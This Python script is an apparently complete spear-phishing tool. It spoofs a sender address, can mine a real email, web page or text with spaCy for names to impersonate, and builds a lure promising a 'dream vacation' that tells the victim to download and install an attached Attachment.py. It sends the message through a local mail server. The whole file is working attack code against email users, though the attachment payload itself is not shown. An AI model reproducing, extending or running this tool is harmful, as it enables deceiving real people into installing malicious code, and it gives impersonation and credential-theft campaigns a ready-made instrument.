# !/usr/bin/python3.8
#----------------------------------------------------------------
#Libraries:

import spacy
import smtplib
import time
import requests
import html2text
import base64
import inquirer
import sys
import quopri
import validators
import os.path
from os.path import basename
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.utils import formatdate
from email.parser import BytesParser
from email.policy import default
#----------------------------------------------------------------
#Globlas - Shared variables:
victim_email = ""
victim_name= ""
spoofed_email = ""
spoofed_name = ""
subject = ""
body = ""
message = ""
raw_email = ""
job_title = ""
attachment_file = "Attachment.py"
#-----------------------FUNCTIONS----------------------
def email_send(dest,src,subject,message,attachment):
    print("Mimic mime email format...")
    time.sleep(1)
    msg = MIMEMultipart()
    msg['From'] = src
    msg['To'] = dest
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = "Re: "+subject
    msg.attach(MIMEText(message))
    with open("Attachment.py", "rb") as fil:
        part = MIMEApplication(
            fil.read(),
            Name=basename(attachment)
        )
        # After the file is closed
        part['Content-Disposition'] = 'attachment; filename="%s"' % basename(attachment)
        msg.attach(part)
    try:
        print("Connecting to local mail server...")
        smtpObj = smtplib.SMTP('localhost')
        print("Server connected.")
        smtpObj.sendmail(src, dest, msg.as_string())
        print( "Successfully sent email")
    except smtplib.SMTPException:
        print( "Error: unable to send email")
    smtpObj.quit()

def from_FILE_to_raw_email(file_name):
    global raw_email
    print("Coping from "+file_name+" raw e-mail content.")
    time.sleep(1)

    with open(file_name, 'rb') as fp:
        raw_email = BytesParser(policy=default).parse(fp)

def from_URL_to_raw_email(url):#assume this is html

    global raw_email
    global body
    session = requests.session()
    response = session.get(url).text
    body = html2text.html2text(response)


def from_raw_email_to_variables():
    print("Extracting information from raw email.")
    time.sleep(1)
    global raw_email
    global victim_name
    global spoofed_name
    global spoofed_email
    global subject
    global body
    msg = raw_email
    spoofed_email = msg['from']
    print("Spoofed email:\t"+spoofed_email)
    time.sleep(1)
    subject = msg['subject']
    print("Subject:\t"+subject)
    time.sleep(1)

    if all(x.isalpha() or x == " " for x in msg['to'].addresses[0].username):
        victim_name = msg['to'].addresses[0].username
        print("Victim name:\t"+victim_name)
    if all(x.isalpha() or x == " " for x in msg['from'].addresses[0].display_name):
        spoofed_name = msg['from'].addresses[0].display_name
        print("Spoofed name:\t"+spoofed_name)
    if (msg.is_multipart()):
        for payload in msg.get_payload():
            text = html2text.html2text(payload.get_payload())
            if ("Content-Transfer-Encoding: base64" in str(msg)):
                body = base64.b64decode(text).decode('utf-8')
            elif("Content-Transfer-Encoding: quoted-printable" in str(msg)):
                body = html2text.html2text(quopri.decodestring(str(payload)).decode('utf-8'))
            else:
                body = text
            break
    else:
        body = html2text.html2text(msg.get_payload()).replace("= ","").replace("=","").replace("*","")
    #print(body)

def from_text():
    global victim_name
    global spoofed_name
    global body
    nlp = spacy.load("en_core_web_sm")
    article = nlp(body)
    for name in article.ents:
        if (spoofed_name == "" and name.label_ == "ORG"):
            spoofed_name = str(name)
            print("Spoofed name : " + str(name))
        if (name.label_ == "PERSON"):
            victim_name = str(name)
            print("Victim name : " + str(name))
def email_body_attack():
    print("Creating the template of the message attack.")
    time.sleep(1)
    global victim_name
    global spoofed_name
    global message
    global job_title
    message = "Hey, " + job_title +" "+ victim_name + \
           "\nI forgot to tell you about some special touranment between excellent workers." \
           "\nThe purpose is to find the outstanding thinking workers." \
           "\nIf you win you will achieve dream vacation!!!!" \
           "\nTrust me, i am excited as you are!" \
           "\nFor more details please download and install the full description instructions." \
           "\nWish you luck," \
           "\n" + spoofed_name

def confirm_sending_message():
    confirm = {
        inquirer.Confirm('confirmed',
                         message="Do you want to send the email?",
                         default=True),
    }
    confirmation = inquirer.prompt(confirm)
    if confirmation["confirmed"]:
        return 1
    else:
        return 0
def confirm_show_sending_message():
    confirm = {
        inquirer.Confirm('confirmed',
                         message="Do you want to see the email?",
                         default=True),
    }
    confirmation = inquirer.prompt(confirm)
    if confirmation["confirmed"]:
        return 1
    else:
        return 0


#----------------Main-Script----------------#

num_of_args = len(sys.argv)
if (num_of_args >= 4):
    user = sys.argv[1]
    mail_service = sys.argv[2]
    job_title = sys.argv[3]
    victim_email = user + mail_service
    if (num_of_args >= 5):
        advance = ' '.join([str(word) for word in sys.argv[4:]])
        if(os.path.isfile(advance)): #the fourth input is file
            print("Advance file execution")
            from_FILE_to_raw_email(advance)
            from_raw_email_to_variables()
            from_text()
            email_body_attack()
            choose = confirm_show_sending_message()
            if (choose == 1):
                print(message)
            choose = confirm_sending_message()
            if (choose == 1):
                email_send(victim_email,spoofed_email,subject,message,attachment_file)
        elif(validators.url(advance)): #the fourth input is url
            print("Advance URL execution")
            from_URL_to_raw_email(advance)
            from_text()
            email_body_attack()
            choose = confirm_show_sending_message()
            if (choose == 1):
                print(message)
            choose = confirm_sending_message()
            if (choose == 1):
                email_send(victim_email,spoofed_email,subject,message,attachment_file)
        else: #the fourth input is email body
            print("Advance email content execution.")

            spoofed_email = "support"+mail_service
            body = html2text.html2text(advance)
            from_text()
            email_body_attack()
            choose = confirm_show_sending_message()
            if (choose == 1):
                print(message)
            choose = confirm_sending_message()
            if (choose == 1):
                email_send(victim_email,spoofed_email,subject,message,attachment_file)
    else:#there is only 3 arguments
        print("Regular execution.")
        spoofed_email = "support" + mail_service
        email_body_attack()
        choose = confirm_show_sending_message()
        if (choose == 1):
            print(message)
        choose = confirm_sending_message()
        if (choose == 1):
            email_send(victim_email,spoofed_email,subject,message,attachment_file)
else:
    print("You shuold input:\n\tpython3.8 <name> <mail service> <job title> <optional argument>")

